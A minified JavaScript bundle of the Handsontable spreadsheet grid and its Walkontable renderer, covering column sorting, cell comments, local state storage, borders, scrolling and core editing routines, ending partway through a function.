var Handsontable={plugins:{},helper:{}};(function($,window,Handsontable){"use strict";function CopyPasteClass(){this.refCounter=0;this.init()}function HandsontableColumnSorting(){function i(){var e=this;e._registerTimeout(setTimeout(function(){e.updateSettings({observeChanges:true})},0))}function s(e){return function(t,n){if(t[1]===null){return e?-1:1}if(n[1]===null){return e?1:-1}if(typeof t[1]=="string")t[1]=t[1].toLowerCase();if(typeof n[1]=="string")n[1]=n[1].toLowerCase();if(t[1]===n[1]){return 0}if(t[1]<n[1])return e?-1:1;if(t[1]>n[1])return e?1:-1;return 0}}function o(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}var r=new Date(t[1]);var i=new Date(n[1]);if(r<i)return e?-1:1;if(r>i)return e?1:-1;return 0}}function u(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}if(parseFloat(t[1])<parseFloat(n[1]))return e?-1:1;if(parseFloat(t[1])>parseFloat(n[1]))return e?1:-1;return 0}}function a(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}var r=typeof t[1]==typeof []?t[1][0]:t[1];var i=typeof n[1]==typeof []?n[1][0]:n[1];if(a.prototype.source[r]<a.prototype.source[i])return e?-1:1;if(a.prototype.source[r]>a.prototype.source[i])return e?1:-1;return 0}}function f(e){return typeof e.sortColumn!="undefined"}var e=this;this.init=function(t){var s=this;var o=s.getSettings().columnSorting;var u,a;s.sortingEnabled=!!o;if(s.sortingEnabled){s.sortIndex=[];var f=n.call(s);if(typeof f!="undefined"){u=f.sortColumn;a=f.sortOrder}else{u=o.column;a=o.sortOrder}e.sortByColumn.call(s,u,a);s.sort=function(){var t=Array.prototype.slice.call(arguments);return e.sortByColumn.apply(s,t)};if(typeof s.getSettings().observeChanges=="undefined"){i.call(s)}if(t=="afterInit"){r.call(s);s.addHook("afterCreateRow",e.afterCreateRow);s.addHook("afterRemoveRow",e.afterRemoveRow);s.addHook("afterLoadData",e.init)}}else{delete s.sort;s.removeHook("afterCreateRow",e.afterCreateRow);s.removeHook("afterRemoveRow",e.afterRemoveRow);s.removeHook("afterLoadData",e.init)}};this.setSortingColumn=function(e,t){var n=this;if(typeof e=="undefined"){delete n.sortColumn;delete n.sortOrder;return}else if(n.sortColumn===e&&typeof t=="undefined"){n.sortOrder=!n.sortOrder}else{n.sortOrder=typeof t!="undefined"?t:true}n.sortColumn=e};this.sortByColumn=function(n,r){var i=this;e.setSortingColumn.call(i,n,r);if(typeof i.sortColumn=="undefined"){return}Handsontable.hooks.run(i,"beforeColumnSort",i.sortColumn,i.sortOrder);e.sort.call(i);i.render();t.call(i);Handsontable.hooks.run(i,"afterColumnSort",i.sortColumn,i.sortOrder)};var t=function(){var e=this;var t={};if(typeof e.sortColumn!="undefined"){t.sortColumn=e.sortColumn}if(typeof e.sortOrder!="undefined"){t.sortOrder=e.sortOrder}if(t.hasOwnProperty("sortColumn")||t.hasOwnProperty("sortOrder")){Handsontable.hooks.run(e,"persistentStateSave","columnSorting",t)}};var n=function(){var e=this;var t={};Handsontable.hooks.run(e,"persistentStateLoad","columnSorting",t);return t.value};var r=function(){function n(){var e=t.view.TBODY.querySelector("tr").querySelectorAll("th");return e.length}function r(e){var t=Handsontable.Dom.closest(e,"TH");return Handsontable.Dom.index(t)-n()}var t=this;t.rootElement.on("click.handsontable",".columnSorting",function(n){var i=r(n.target);e.sortByColumn.call(t,i)})};this.sort=function(){var e=this;if(typeof e.sortOrder=="undefined"){return}e.sortingEnabled=false;e.sortIndex.length=0;var t=this.colOffset();for(var n=0,r=this.countRows()-e.getSettings()["minSpareRows"];n<r;n++){this.sortIndex.push([n,e.getDataAtCell(n,this.sortColumn+t)])}var i=e.getCellMeta(0,e.sortColumn);var f;switch(i.type){case"date":f=o;break;case"numeric":f=u;break;default:var l=e.manualColumnPositions[e.sortColumn+e.colOffset()];if(e.getSettings().columns[l].selectOptions){f=a;var c=e.getSettings().columns[l];if(!c.dictionary){c.dictionary=[];for(var n=0;n<c.selectOptions.length;n++){if(c.selectOptions[n])c.dictionary[c.selectOptions[n].value]=c.selectOptions[n].name}}a.prototype.source=c.dictionary}else f=s}this.sortIndex.sort(f(e.sortOrder));for(var n=this.sortIndex.length;n<e.countRows();n++){this.sortIndex.push([n,e.getDataAtCell(n,this.sortColumn+t)])}e.sortingEnabled=true};this.translateRow=function(e){var t=this;if(t.sortingEnabled&&t.sortIndex&&t.sortIndex.length&&t.sortIndex[e]){return t.sortIndex[e][0]}return e};this.untranslateRow=function(e){var t=this;if(t.sortingEnabled&&t.sortIndex&&t.sortIndex.length){for(var n=0;n<t.sortIndex.length;n++){if(t.sortIndex[n][0]==e){return n}}}};this.getColHeader=function(e,t){if(this.getSettings().columnSorting&&e>=0){Handsontable.Dom.addClass(t.querySelector(".colHeader"),"columnSorting")}};this.afterCreateRow=function(e,n){var r=this;if(!f(r)){return}for(var i=0;i<r.sortIndex.length;i++){if(r.sortIndex[i][0]>=e){r.sortIndex[i][0]+=n}}for(var i=0;i<n;i++){r.sortIndex.splice(e+i,0,[e+i,r.getData()[e+i][r.sortColumn+r.colOffset()]])}t.call(r)};this.afterRemoveRow=function(n,r){var i=this;if(!f(i)){return}var s=e.translateRow.call(i,n);i.sortIndex.splice(n,r);for(var o=0;o<i.sortIndex.length;o++){if(i.sortIndex[o][0]>s){i.sortIndex[o][0]-=r}}t.call(i)};this.afterChangeSort=function(t){var n=this;var r=false;var i={};if(!t){return}for(var s=0;s<t.length;s++){if(t[s][1]==n.sortColumn){r=true;i.row=e.translateRow.call(n,t[s][0]);i.col=t[s][1];break}}if(r){n._registerTimeout(setTimeout(function(){e.sort.call(n);n.render();n.selectCell(e.untranslateRow.call(n,i.row),i.col)},0))}}}function Comments(e){var t=function(e,t,n,r){r.setCellMeta(e,t,"comment",n);r.render()},n=function(e,n,r){t(e.from.row,e.from.col,n,r)},r=function(){var e=u();e.style.display="none";e.value=""},i=function(t){function i(i){$(document).off("mouseover.htCommment");if(!(i.target.className=="htCommentTextArea"||i.target.innerHTML.indexOf("Comment")!=-1)){var o=document.getElementsByClassName("htCommentTextArea")[0].value;if(o.trim().length>1){n(t,o,e)}s();r()}}$(document).on("mousedown.htCommment",Handsontable.helper.proxy(i))},s=function(){$(document).off("mousedown.htCommment");$(document).on("mouseover.htCommment",Handsontable.helper.proxy(a))},o=function(t,n){var r=e.view.wt.wtTable.getCell(t.from),s=Handsontable.Dom.offset(r),o=e.getColWidth(t.from.col);n.style.position="absolute";n.style.left=s.left+o+"px";n.style.top=s.top+"px";n.style.zIndex=2;i(t,n)},u=function(e){var t=document.getElementsByClassName("htComments")[0];if(!t){t=document.createElement("DIV");var n=document.createElement("TEXTAREA");Handsontable.Dom.addClass(n,"htCommentTextArea");t.appendChild(n);Handsontable.Dom.addClass(t,"htComments");document.getElementsByTagName("body")[0].appendChild(t)}e=e||"";document.getElementsByClassName("htCommentTextArea")[0].value=e;return t},a=function(t){if(t.target.className.indexOf("htCommentCell")!=-1){s();var n=e.view.wt.wtTable.getCoords(t.target);var i={from:new WalkontableCellCoords(n.row,n.col)};Handsontable.Comments.showComment(i)}else if(t.target.className!="htCommentTextArea"){r()}};return{init:function(){$(document).on("mouseover.htCommment",Handsontable.helper.proxy(a))},showComment:function(t){var n=e.getCellMeta(t.from.row,t.from.col),r="";if(n.comment){r=n.comment}var i=u(r);i.style.display="block";o(t,i)},removeComment:function(t,n){e.removeCellMeta(t,n,"comment");e.render()},checkSelectionCommentsConsistency:function(){var t=false;var n=e.getSelectedRange().from;if(e.getCellMeta(n.row,n.col).comment){t=true}return t}}}function Storage(e){var t;var n=function(){window.localStorage[e+"__"+"persistentStateKeys"]=JSON.stringify(t)};var r=function(){var n=window.localStorage[e+"__"+"persistentStateKeys"];var r=typeof n=="string"?JSON.parse(n):void 0;t=r?r:[]};var i=function(){t=[];n()};r();this.saveValue=function(r,i){window.localStorage[e+"_"+r]=JSON.stringify(i);if(t.indexOf(r)==-1){t.push(r);n()}};this.loadValue=function(t,n){t=typeof t!="undefined"?t:n;var r=window.localStorage[e+"_"+t];return typeof r=="undefined"?void 0:JSON.parse(r)};this.reset=function(t){window.localStorage.removeItem(e+"_"+t)};this.resetAll=function(){for(var n=0;n<t.length;n++){window.localStorage.removeItem(e+"_"+t[n])}i()}}function DragToScroll(){this.boundaries=null;this.callback=null}function CellInfoCollection(){var e=[];e.getInfo=function(e,t){for(var n=0,r=this.length;n<r;n++){if(this[n].row<=e&&this[n].row+this[n].rowspan-1>=e&&this[n].col<=t&&this[n].col+this[n].colspan-1>=t){return this[n]}}};e.setInfo=function(e){for(var t=0,n=this.length;t<n;t++){if(this[t].row===e.row&&this[t].col===e.col){this[t]=e;return}}this.push(e)};e.removeInfo=function(e,t){for(var n=0,r=this.length;n<r;n++){if(this[n].row===e&&this[n].col===t){this.splice(n,1);break}}};return e}function MergeCells(e){this.mergedCellInfoCollection=new CellInfoCollection;if(Handsontable.helper.isArray(e)){for(var t=0,n=e.length;t<n;t++){this.mergedCellInfoCollection.setInfo(e[t])}}}function WalkontableOverlay(){}function WalkontableAbstractStrategy(e){this.instance=e}function WalkontableBorder(e,t){var n;if(!t){return}this.instance=e;this.settings=t;this.main=document.createElement("div");n=this.main.style;n.position="absolute";n.top=0;n.left=0;var r=["top","left","bottom","right","corner"];for(var i=0;i<5;i++){var s=r[i];var o=document.createElement("DIV");o.className="wtBorder "+(this.settings.className||"");if(this.settings[s]&&this.settings[s].hide){o.className+=" hidden"}n=o.style;n.backgroundColor=this.settings[s]&&this.settings[s].color?this.settings[s].color:t.border.color;n.height=this.settings[s]&&this.settings[s].width?this.settings[s].width+"px":t.border.width+"px";n.width=this.settings[s]&&this.settings[s].width?this.settings[s].width+"px":t.border.width+"px";this.main.appendChild(o)}this.top=this.main.childNodes[0];this.left=this.main.childNodes[1];this.bottom=this.main.childNodes[2];this.right=this.main.childNodes[3];this.topStyle=this.top.style;this.leftStyle=this.left.style;this.bottomStyle=this.bottom.style;this.rightStyle=this.right.style;this.corner=this.main.childNodes[4];this.corner.className+=" corner";this.cornerStyle=this.corner.style;this.cornerStyle.width="5px";this.cornerStyle.height="5px";this.cornerStyle.border="2px solid #FFF";this.disappear();if(!e.wtTable.bordersHolder){e.wtTable.bordersHolder=document.createElement("div");e.wtTable.bordersHolder.className="htBorders";e.wtTable.hider.appendChild(e.wtTable.bordersHolder)}e.wtTable.bordersHolder.insertBefore(this.main,e.wtTable.bordersHolder.firstChild);var u=false;var a=$(document.body);a.on("mousedown.walkontable."+e.guid,function(){u=true});a.on("mouseup.walkontable."+e.guid,function(){u=false});$(this.main.childNodes).on("mouseenter",function(t){if(!u||!e.getSetting("hideBorderOnMouseDownOver")){return}t.preventDefault();t.stopImmediatePropagation();var n=this.getBoundingClientRect();var r=$(this);r.hide();var i=function(e){if(e.clientY<Math.floor(n.top)){return true}if(e.clientY>Math.ceil(n.top+n.height)){return true}if(e.clientX<Math.floor(n.left)){return true}if(e.clientX>Math.ceil(n.left+n.width)){return true}};a.on("mousemove.border."+e.guid,function(t){if(i(t)){a.off("mousemove.border."+e.guid);r.show()}})})}function WalkontableCellCoords(e,t){if(typeof e!=="undefined"&&typeof t!=="undefined"){this.row=e;this.col=t}else{this.row=null;this.col=null}}function WalkontableCellRange(e,t,n){this.highlight=e;this.from=t;this.to=n}function WalkontableColumnFilter(e,t){this.total=e;this.countTH=t}function WalkontableColumnStrategy(e,t,n,r){var i,s=0;WalkontableAbstractStrategy.apply(this,arguments);this.containerSizeFn=t;this.cellSizesSum=0;this.cellSizes=[];this.cellStretch=[];this.cellCount=0;this.visibleCellCount=0;this.remainingSize=0;this.strategy=r;while(true){i=n(s);if(i===void 0){break}if(this.cellSizesSum<this.getContainerSize(this.cellSizesSum+i)){this.visibleCellCount++}this.cellSizes.push(i);this.cellSizesSum+=i;this.cellCount++;s++}var o=this.getContainerSize(this.cellSizesSum);this.remainingSize=this.cellSizesSum-o}function Walkontable(e){var t=[];this.guid="wt_"+walkontableRandomString();if(e.cloneSource){this.cloneSource=e.cloneSource;this.cloneOverlay=e.cloneOverlay;this.wtSettings=e.cloneSource.wtSettings;this.wtTable=new WalkontableTable(this,e.table);this.wtScroll=new WalkontableScroll(this);this.wtViewport=e.cloneSource.wtViewport;this.wtEvent=new WalkontableEvent(this);this.selections=this.cloneSource.selections}else{this.wtSettings=new WalkontableSettings(this,e);this.wtTable=new WalkontableTable(this,e.table);this.wtScroll=new WalkontableScroll(this);this.wtViewport=new WalkontableViewport(this);this.wtEvent=new WalkontableEvent(this);this.selections=this.getSetting("selections");this.wtScrollbars=new WalkontableScrollbars(this)}if(this.wtTable.THEAD.childNodes.length&&this.wtTable.THEAD.childNodes[0].childNodes.length){for(var n=0,r=this.wtTable.THEAD.childNodes[0].childNodes.length;n<r;n++){t.push(this.wtTable.THEAD.childNodes[0].childNodes[n].innerHTML)}if(!this.getSetting("columnHeaders").length){this.update("columnHeaders",[function(e,n){Handsontable.Dom.fastInnerText(n,t[e])}])}}this.drawn=false;this.drawInterrupted=false}function WalkontableDebugOverlay(e){this.instance=e;this.init();this.clone=this.makeClone("debug");this.clone.wtTable.holder.style.opacity=.4;this.clone.wtTable.holder.style.textShadow="0 0 2px #ff0000";this.lastTimeout=null;var t=this;var n=0;var r=0;var i=t.clone.wtTable.holder.parentNode;$(document.body).on("mousemove."+this.instance.guid,function(e){if(!t.instance.wtTable.holder.parentNode){return}if(e.clientX-n>-5&&e.clientX-n<5&&e.clientY-r>-5&&e.clientY-r<5){return}n=e.clientX;r=e.clientY;Handsontable.Dom.addClass(i,"wtDebugHidden");Handsontable.Dom.removeClass(i,"wtDebugVisible");clearTimeout(this.lastTimeout);this.lastTimeout=setTimeout(function(){Handsontable.Dom.removeClass(i,"wtDebugHidden");Handsontable.Dom.addClass(i,"wtDebugVisible")},1e3)})}function WalkontableEvent(e){var t=this;this.instance=e;var n=[null,null];this.dblClickTimeout=[null,null];var r=function(e){var r=t.parentCell(e.target);if(Handsontable.Dom.hasClass(e.target,"corner")){t.instance.getSetting("onCellCornerMouseDown",e,e.target)}else if(r.TD){if(t.instance.hasSetting("onCellMouseDown")){t.instance.getSetting("onCellMouseDown",e,r.coords,r.TD,t.instance)}}if(e.button!==2){if(r.TD){n[0]=r.TD;clearTimeout(t.dblClickTimeout[0]);t.dblClickTimeout[0]=setTimeout(function(){n[0]=null},1e3)}}};var i;var s=function(e){if(t.instance.hasSetting("onCellMouseOver")){var n=t.instance.wtTable.TABLE;var r=Handsontable.Dom.closest(e.target,["TD","TH"],n);if(r&&r!==i&&Handsontable.Dom.isChildOf(r,n)){i=r;t.instance.getSetting("onCellMouseOver",e,t.instance.wtTable.getCoords(r),r,t.instance)}}};var o=function(e){if(e.button!==2){var r=t.parentCell(e.target);if(r.TD===n[0]&&r.TD===n[1]){if(Handsontable.Dom.hasClass(e.target,"corner")){t.instance.getSetting("onCellCornerDblClick",e,r.coords,r.TD,t.instance)}else{t.instance.getSetting("onCellDblClick",e,r.coords,r.TD,t.instance)}n[0]=null;n[1]=null}else if(r.TD===n[0]){n[1]=r.TD;clearTimeout(t.dblClickTimeout[1]);t.dblClickTimeout[1]=setTimeout(function(){n[1]=null},500)}}};$(this.instance.wtTable.holder).on("mousedown",r);$(this.instance.wtTable.TABLE).on("mouseover",s);$(this.instance.wtTable.holder).on("mouseup",o);$(window).on("resize."+this.instance.guid,function(){t.instance.draw()})}function walkontableRangesIntersect(){var e=arguments[0];var t=arguments[1];for(var n=1,r=arguments.length/2;n<r;n++){if(e<=arguments[2*n+1]&&t>=arguments[2*n]){return true}}return false}function walkontableRandomString(){function e(){return Math.floor((1+Math.random())*65536).toString(16).substring(1)}return e()+e()+e()+e()}function WalkontableRowFilter(e,t,n){this.offset=e;this.total=t;this.countTH=n}function WalkontableRowStrategy(e,t,n){WalkontableAbstractStrategy.apply(this,arguments);this.containerSizeFn=t;this.sizeAtIndex=n;this.cellSizesSum=0;this.cellSizes=[];this.cellCount=0;this.visiblCellCount=0;this.remainingSize=-Infinity;this.maxOuts=10;this.curOuts=this.maxOuts}function WalkontableScroll(e){this.instance=e}function WalkontableCornerScrollbarNative(e){this.instance=e;this.type="corner";this.init();this.clone=this.makeClone("corner")}function WalkontableHorizontalScrollbarNative(e){this.instance=e;this.type="horizontal";this.cellSize=50;this.offset=0;this.init();this.clone=this.makeClone("left")}function WalkontableVerticalScrollbarNative(e){this.instance=e;this.type="vertical";this.cellSize=this.instance.wtSettings.settings.defaultRowHeight;this.offset;this.total;this.init();this.clone=this.makeClone("top")}function WalkontableScrollbars(e){this.instance=e;e.update("scrollbarWidth",Handsontable.Dom.getScrollbarWidth());e.update("scrollbarHeight",Handsontable.Dom.getScrollbarWidth());this.vertical=new WalkontableVerticalScrollbarNative(e);this.horizontal=new WalkontableHorizontalScrollbarNative(e);this.corner=new WalkontableCornerScrollbarNative(e);if(e.getSetting("debug")){this.debug=new WalkontableDebugOverlay(e)}this.registerListeners()}function WalkontableSelection(e,t){this.settings=e;this.cellRange=t||null;this.instanceBorders={}}function WalkontableSettings(e,t){var n=this;this.instance=e;this.defaults={table:void 0,debug:false,stretchH:"none",currentRowClassName:null,currentColumnClassName:null,data:void 0,offsetRow:0,fixedColumnsLeft:0,fixedRowsTop:0,rowHeaders:function(){return[]},columnHeaders:function(){return[]},totalRows:void 0,totalColumns:void 0,width:null,height:null,cellRenderer:function(e,t,r){var i=n.getSetting("data",e,t);Handsontable.Dom.fastInnerText(r,i===void 0||i===null?"":i)},columnWidth:50,rowHeight:function(e){return 23},defaultRowHeight:23,selections:null,hideBorderOnMouseDownOver:false,onCellMouseDown:null,onCellMouseOver:null,onCellDblClick:null,onCellCornerMouseDown:null,onCellCornerDblClick:null,beforeDraw:null,onDraw:null,onBeforeDrawBorders:null,onScrollVertically:null,onScrollHorizontally:null,scrollbarWidth:10,scrollbarHeight:10,renderAllRows:false,groups:false};this.settings={};for(var r in this.defaults){if(this.defaults.hasOwnProperty(r)){if(t[r]!==void 0){this.settings[r]=t[r]}else if(this.defaults[r]===void 0){throw new Error('A required setting "'+r+'" was not provided')}else{this.settings[r]=this.defaults[r]}}}}function WalkontableTable(e,t){this.instance=e;this.TABLE=t;Handsontable.Dom.removeTextNodes(this.TABLE);var n=this.TABLE.parentNode;if(!n||n.nodeType!==1||!Handsontable.Dom.hasClass(n,"wtHolder")){var r=document.createElement("DIV");r.className="wtSpreader";if(n){n.insertBefore(r,this.TABLE)}r.appendChild(this.TABLE)}this.spreader=this.TABLE.parentNode;n=this.spreader.parentNode;if(!n||n.nodeType!==1||!Handsontable.Dom.hasClass(n,"wtHolder")){var i=document.createElement("DIV");i.className="wtHider";if(n){n.insertBefore(i,this.spreader)}i.appendChild(this.spreader)}this.hider=this.spreader.parentNode;this.hiderStyle=this.hider.style;this.hiderStyle.position="relative";n=this.hider.parentNode;if(!n||n.nodeType!==1||!Handsontable.Dom.hasClass(n,"wtHolder")){var s=document.createElement("DIV");s.style.position="relative";s.className="wtHolder";if(!e.cloneSource){s.className+=" ht_master"}if(n){n.insertBefore(s,this.hider)}s.appendChild(this.hider)}this.holder=this.hider.parentNode;this.TBODY=this.TABLE.getElementsByTagName("TBODY")[0];if(!this.TBODY){this.TBODY=document.createElement("TBODY");this.TABLE.appendChild(this.TBODY)}this.THEAD=this.TABLE.getElementsByTagName("THEAD")[0];if(!this.THEAD){this.THEAD=document.createElement("THEAD");this.TABLE.insertBefore(this.THEAD,this.TBODY)}this.COLGROUP=this.TABLE.getElementsByTagName("COLGROUP")[0];if(!this.COLGROUP){this.COLGROUP=document.createElement("COLGROUP");this.TABLE.insertBefore(this.COLGROUP,this.THEAD)}if(this.instance.getSetting("columnHeaders").length){if(!this.THEAD.childNodes.length){var o=document.createElement("TR");this.THEAD.appendChild(o)}}this.colgroupChildrenLength=this.COLGROUP.childNodes.length;this.theadChildrenLength=this.THEAD.firstChild?this.THEAD.firstChild.childNodes.length:0;this.tbodyChildrenLength=this.TBODY.childNodes.length;this.rowFilter=null;this.columnFilter=null;this.columnWidthCache=[]}function WalkontableTableRenderer(e){this.wtTable=e;this.instance=e.instance;this.rowFilter=e.rowFilter;this.columnFilter=e.columnFilter;this.TABLE=e.TABLE;this.THEAD=e.THEAD;this.TBODY=e.TBODY;this.COLGROUP=e.COLGROUP;this.utils=WalkontableTableRenderer.utils}function WalkontableViewport(e){this.instance=e;this.resetSettings();var t=this;$(window).on("resize.walkontable."+this.instance.guid,function(){t.clientHeight=t.getWorkspaceHeight()})}if(!Array.prototype.indexOf){Array.prototype.indexOf=function(e){var t=this.length>>>0;var n=Number(arguments[1])||0;n=n<0?Math.ceil(n):Math.floor(n);if(n<0)n+=t;for(;n<t;n++){if(n in this&&this[n]===e)return n}return-1}}if(!Array.prototype.filter){Array.prototype.filter=function(e,t){"use strict";function o(e){return/NodeList/i.test(e.item)}function u(e){var t=[];for(var n=0,r=e.length;n<r;n++){t[n]=e[n]}return t}if(typeof this==="undefined"||this===null){throw new TypeError}if(typeof e!=="function"){throw new TypeError}t=t||this;if(o(t)){t=u(t)}var n=t.length,r=[],i,s;for(i=0;i<n;i+=1){if(t.hasOwnProperty(i)){s=t[i];if(e.call(t,s,i,t)){r.push(s)}}}return r}}if(typeof WeakMap==="undefined"){(function(){var e=Object.defineProperty;try{var t=true;e(function(){},"foo",{})}catch(n){t=false}var r=+(new Date)%1e9;var i=function(){this.name="__st"+(Math.random()*1e9>>>0)+(r++ +"__");if(!t){this._wmCache=[]}};if(t){i.prototype={set:function(t,n){var r=t[this.name];if(r&&r[0]===t)r[1]=n;else e(t,this.name,{value:[t,n],writable:true})},get:function(e){var t;return(t=e[this.name])&&t[0]===e?t[1]:undefined},"delete":function(e){this.set(e,undefined)}}}else{i.prototype={set:function(e,t){if(typeof e=="undefined"||typeof t=="undefined")return;for(var n=0,r=this._wmCache.length;n<r;n++){if(this._wmCache[n].key==e){this._wmCache[n].value=t;return}}this._wmCache.push({key:e,value:t})},get:function(e){if(typeof e=="undefined")return;for(var t=0,n=this._wmCache.length;t<n;t++){if(this._wmCache[t].key==e){return this._wmCache[t].value}}return},"delete":function(e){if(typeof e=="undefined")return;for(var t=0,n=this._wmCache.length;t<n;t++){if(this._wmCache[t].key==e){Array.prototype.slice.call(this._wmCache,t,1)}}}}}window.WeakMap=i})()}Handsontable.activeGuid=null;Handsontable.Core=function(e,t){function c(){var e=false;return{validatorsInQueue:0,addValidatorToQueue:function(){this.validatorsInQueue++;e=false},removeValidatorFormQueue:function(){this.validatorsInQueue=this.validatorsInQueue-1<0?0:this.validatorsInQueue-1;this.checkIfQueueIsEmpty()},onQueueEmpty:function(){},checkIfQueueIsEmpty:function(){if(this.validatorsInQueue==0&&e==false){e=true;this.onQueueEmpty()}}}}function h(e,t,n){function m(){var r;if(e.length){r=Handsontable.hooks.execute(u,"beforeChange",e,t);if(typeof r==="function"){$.when(result).then(function(){n()})}else if(r===false){e.splice(0,e.length)}}if(typeof r!=="function"){n()}}var i=new c;i.onQueueEmpty=m;for(var s=e.length-1;s>=0;s--){if(e[s]===null){e.splice(s,1)}else{var o=e[s][0];var a=r.propToCol(e[s][1]);var f=u.runHooksAndReturn("modifyCol",a);try{var l=e[s][1];for(var h=0;h<u.countCols();h++){if(u.colToProp(h)==l){f=h;break}}}catch(p){}var d=u.getCellMeta(o,f);if(d.type==="numeric"&&typeof e[s][3]==="string"){if(e[s][3].length>0&&/^-?[\d\s]*(\.|\,)?\d*$/.test(e[s][3])){var v=e[s][3].length;if(typeof d.language=="undefined"){numeral.language("en")}else if(e[s][3].indexOf(".")===v-3&&e[s][3].indexOf(",")===-1){numeral.language("en")}else{numeral.language(d.language)}e[s][3]=numeral().unformat(e[s][3]||"0")}}if(u.getCellValidator(d)){i.addValidatorToQueue();u.validateCell(e[s][3],d,function(t,n){return function(r){if(typeof r!=="boolean"){throw new Error("Validation error: result is not boolean")}if(r===false&&n.allowInvalid===false){e.splice(t,1);n.valid=true;--t}i.removeValidatorFormQueue()}}(s,d),t)}}}i.checkIfQueueIsEmpty()}function p(e,t){var o=e.length-1;if(o<0){return}for(;0<=o;o--){if(e[o]===null){e.splice(o,1);continue}if(e[o][2]==null&&e[o][3]==null){continue}if(n.settings.minSpareRows){while(e[o][0]>u.countRows()-1){r.createRow()}}if(u.dataType==="array"&&n.settings.minSpareCols){while(r.propToCol(e[o][1])>u.countCols()-1){r.createCol()}}r.set(e[o][0],e[o][1],e[o][3])}u.forceFullRender=true;i.adjustRowsAndCols();Handsontable.hooks.run(u,"beforeChangeRender",e,t);s.refreshBorders(null,true);Handsontable.hooks.run(u,"afterChange",e,t||"edit")}function d(e,t,n){if(typeof e==="object"){return e}else if($.isPlainObject(n)){return n}else{return[[e,t,n]]}}function v(e){if(!e.hasOwnProperty("type"))return;var t,n={};if(typeof e.type==="object"){t=e.type}else if(typeof e.type==="string"){t=Handsontable.cellTypes[e.type];if(t===void 0){throw new Error('You declared cell type "'+e.type+'" as a string that is not mapped to a known object. Cell type must be an object or a string mapped to an object in Handsontable.cellTypes')}}for(var r in t){if(t.hasOwnProperty(r)&&!e.hasOwnProperty(r)){n[r]=t[r]}}return n}function m(e){return Handsontable.hooks.execute(u,"modifyRow",e)}function g(e){return Handsontable.hooks.execute(u,"modifyCol",e)}function b(){throw new Error("This method cannot be called because this Handsontable instance has been destroyed")}var n,r,i,s,o,u=this,a=function(){},f=$(document.documentElement),l=$(document.body);Handsontable.helper.extend(a.prototype,DefaultSettings.prototype);Handsontable.helper.extend(a.prototype,t);Handsontable.helper.extend(a.prototype,v(t));this.rootElement=e;this.container=document.createElement("DIV");this.container.className="htContainer";e.prepend(this.container);this.container=$(this.container);this.guid="ht_"+Handsontable.helper.randomString();if(!this.rootElement[0].id||this.rootElement[0].id.substring(0,3)==="ht_"){this.rootElement[0].id=this.guid}n={cellSettings:[],columnSettings:[],columnsSettingConflicts:["data","width"],settings:new a,selRange:null,isPopulated:null,scrollable:null,firstRun:true};i={alter:function(e,t,o,a,f){var l;o=o||1;switch(e){case"insert_row":l=r.createRow(t,o);if(l){if(s.isSelected()&&n.selRange.from.row>=t){n.selRange.from.row=n.selRange.from.row+l;s.transformEnd(l,0)}else{s.refreshBorders()}}break;case"insert_col":l=r.createCol(t,o);if(l){if(Handsontable.helper.isArray(u.getSettings().colHeaders)){var c=[t,0];c.length+=l;Array.prototype.splice.apply(u.getSettings().colHeaders,c)}if(s.isSelected()&&n.selRange.from.col>=t){n.selRange.from.col=n.selRange.from.col+l;s.transformEnd(0,l)}else{s.refreshBorders()}}break;case"remove_row":r.removeRow(t,o);n.cellSettings.splice(t,o);i.adjustRowsAndCols();s.refreshBorders();break;case"remove_col":r.removeCol(t,o);for(var h=0,p=r.getAll().length;h<p;h++){if(h in n.cellSettings){n.cellSettings[h].splice(t,o)}}if(Handsontable.helper.isArray(u.getSettings().colHeaders)){if(typeof t=="undefined"){t=-1}u.getSettings().colHeaders.splice(t,o)}n.columnSettings.splice(t,o);i.adjustRowsAndCols();s.refreshBorders();break;default:throw new Error('There is no such action "'+e+'"');break}if(!f){i.adjustRowsAndCols()}},adjustRowsAndCols:function(){var e,t,i,o;t=u.countRows();if(t<n.settings.minRows){for(e=0;e<n.settings.minRows-t;e++){r.createRow(u.countRows(),1,true)}}i=u.countEmptyRows(true);if(i<n.settings.minSpareRows){for(;i<n.settings.minSpareRows&&u.countRows()<n.settings.maxRows;i++){r.createRow(u.countRows(),1,true)}}o=u.countEmptyCols(true);if(!n.settings.columns&&u.countCols()<n.settings.minCols){for(;u.countCols()<n.settings.minCols;o++){r.createCol(u.countCols(),1,true)}}if(!n.settings.columns&&u.dataType==="array"&&o<n.settings.minSpareCols){for(;o<n.settings.minSpareCols&&u.countCols()<n.settings.maxCols;o++){r.createCol(u.countCols(),1,true)}}var a=u.countRows();var f=u.countCols();if(a===0||f===0){s.deselect()}if(s.isSelected()){var l;var c=n.selRange.from.row;var h=n.selRange.from.col;var p=n.selRange.to.row;var d=n.selRange.to.col;if(c>a-1){c=a-1;l=true;if(p>c){p=c}}else if(p>a-1){p=a-1;l=true;if(c>p){c=p}}if(h>f-1){h=f-1;l=true;if(d>h){d=h}}else if(d>f-1){d=f-1;l=true;if(h>d){h=d}}if(l){u.selectCell(c,h,p,d)}}},populateFromArray:function(e,t,r,i,s){var o,a,f,l,c=[],h={};a=t.length;if(a===0){return false}var p,d,v,m;switch(s){case"shift_down":p=r?r.col-e.col+1:0;d=r?r.row-e.row+1:0;t=Handsontable.helper.translateRowsToColumns(t);for(f=0,l=t.length,v=Math.max(l,p);f<v;f++){if(f<l){for(o=0,a=t[f].length;o<d-a;o++){t[f].push(t[f][o%a])}t[f].unshift(e.col+f,e.row,0);u.spliceCol.apply(u,t[f])}else{t[f%l][0]=e.col+f;u.spliceCol.apply(u,t[f%l])}}break;case"shift_right":p=r?r.col-e.col+1:0;d=r?r.row-e.row+1:0;for(o=0,a=t.length,m=Math.max(a,d);o<m;o++){if(o<a){for(f=0,l=t[o].length;f<p-l;f++){t[o].push(t[o][f%l])}t[o].unshift(e.row+o,e.col,0);u.spliceRow.apply(u,t[o])}else{t[o%a][0]=e.row+o;u.spliceRow.apply(u,t[o%a])}}break;case"overwrite":default:h.row=e.row;h.col=e.col;for(o=0;o<a;o++){if(r&&h.row>r.row||!n.settings.minSpareRows&&h.row>u.countRows()-1||h.row>=n.settings.maxRows){break}h.col=e.col;l=t[o]?t[o].length:0;for(f=0;f<l;f++){if(r&&h.col>r.col||!n.settings.minSpareCols&&h.col>u.countCols()-1||h.col>=n.settings.maxCols){break}if(!u.getCellMe